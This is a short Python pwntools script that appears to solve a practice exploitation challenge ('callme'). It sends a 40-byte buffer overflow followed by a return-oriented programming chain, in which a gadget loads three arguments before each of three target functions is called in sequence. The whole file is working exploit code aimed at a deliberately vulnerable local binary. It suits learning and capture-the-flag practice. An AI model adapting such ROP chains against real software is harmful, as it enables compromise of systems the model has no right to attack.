from pwn import *

def args():
    a  = p64(0x00401ab0) # pop, pop, pop
    a += p64(1)          # arg1
    a += p64(2)          # arg2
    a += p64(3)          # arg3
    return a

p = process('./callme')
p.recv()

payload  = b'A' * 40
payload += p64(0x004017d9)                      # ret align
for i in [0x00401850, 0x00401870, 0x00401810]:  # one, two, three
    payload += args()                           # pop args
    payload += p64(i)                           # func

p.sendline(payload)
p.interactive()
